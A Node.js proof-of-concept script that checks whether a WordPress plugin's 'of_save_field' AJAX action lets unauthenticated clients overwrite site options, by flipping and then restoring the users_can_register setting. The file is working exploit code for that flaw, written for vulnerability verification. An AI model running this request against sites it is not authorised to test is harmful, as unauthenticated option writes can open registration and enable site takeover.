// probe.mjs - verifies whether the old-forms <= 1.4.2 `of_save_field` AJAX action
// lets an unauthenticated client write arbitrary WordPress options.
//
// Method (non-destructive, reversible):
//   1. Read the current state of users_can_register via the registration page
//      (enabled = 200 form, disabled = 302 to ?registration=disabled).
//   2. Unauthenticated POST to admin-ajax.php, action=of_save_field, key=users_can_register,
//      value = the opposite of the current state.
//   3. Re-read the registration page. If the state flipped, the write was accepted.
//   4. Restore the original value (best effort, always attempted once a write was tried).
//
// Usage:   node probe.mjs <base-url>      e.g. node probe.mjs http://127.0.0.1:8184
// Exit 0 = vulnerable (arbitrary option write confirmed)
// Exit 1 = not vulnerable, or could not confirm

const OPTION = 'users_can_register';
const TIMEOUT_MS = 10000;

function fail(msg) {
  console.error(msg);
  process.exit(1);
}

const raw = process.argv[2];
if (!raw) fail('usage: node probe.mjs <base-url>');

let root;
try {
  root = new URL(raw);
} catch {
  fail('invalid base URL');
}
if (root.protocol !== 'http:' && root.protocol !== 'https:') {
  fail('base URL must be http or https');
}
// Normalise to a directory-style base so relative paths resolve under it.
root.search = '';
root.hash = '';
root.pathname = root.pathname.replace(/\/*$/, '/');

function url(path) {
  const u = new URL(path, root);
  // Every request must stay on the origin the caller supplied.
  if (u.origin !== root.origin) throw new Error('refusing to leave target origin');
  return u.toString();
}

async function req(path, init = {}) {
  return fetch(url(path), {
    redirect: 'manual',
    signal: AbortSignal.timeout(TIMEOUT_MS),
    ...init,
    headers: { 'User-Agent': 'old-forms-verify/1.0', ...(init.headers || {}) },
  });
}

// true = registration enabled, false = disabled. Throws on anything unexpected.
async function registrationEnabled() {
  const r = await req('wp-login.php?action=register');
  await r.body?.cancel();
  if (r.status === 200) return true;
  const loc = r.headers.get('location') || '';
  if (r.status >= 300 && r.status < 400 && loc.includes('registration=disabled')) return false;
  throw new Error(`unexpected registration page response: HTTP ${r.status} ${loc}`);
}

// Sends the unauthenticated of_save_field request. Returns true if the endpoint reports success.
async function setOption(name, value) {
  const r = await req('wp-admin/admin-ajax.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ action: 'of_save_field', key: name, value }).toString(),
  });
  const text = await r.text();
  try {
    const json = JSON.parse(text);
    return r.ok && json?.success === true;
  } catch {
    return false;
  }
}

async function main() {
  let originallyEnabled;
  try {
    originallyEnabled = await registrationEnabled();
  } catch (e) {
    fail(`cannot read baseline state: ${e.message}`);
  }

  const originalValue = originallyEnabled ? '1' : '0';
  const probeValue = originallyEnabled ? '0' : '1';
  const expectEnabledAfterWrite = probeValue === '1';

  let attempted = false;
  let vulnerable = false;
  let detail = '';

  try {
    attempted = true;
    const accepted = await setOption(OPTION, probeValue);
    if (!accepted) {
      detail = 'endpoint rejected the unauthenticated write';
    } else {
      const now = await registrationEnabled();
      vulnerable = now === expectEnabledAfterWrite;
      detail = vulnerable
        ? `option ${OPTION} changed without authentication`
        : 'endpoint reported success but the option did not change';
    }
  } catch (e) {
    detail = `error during probe: ${e.message}`;
  } finally {
    if (attempted) {
      try {
        await setOption(OPTION, originalValue);
        const restored = await registrationEnabled();
        if (restored !== originallyEnabled) {
          console.error(`warning: ${OPTION} restore could not be verified`);
        }
      } catch (e) {
        console.error(`warning: restore of ${OPTION} failed: ${e.message}`);
      }
    }
  }

  if (vulnerable) {
    console.log(`VULNERABLE: ${detail}`);
    process.exit(0);
  }
  console.log(`NOT VULNERABLE: ${detail}`);
  process.exit(1);
}

main();
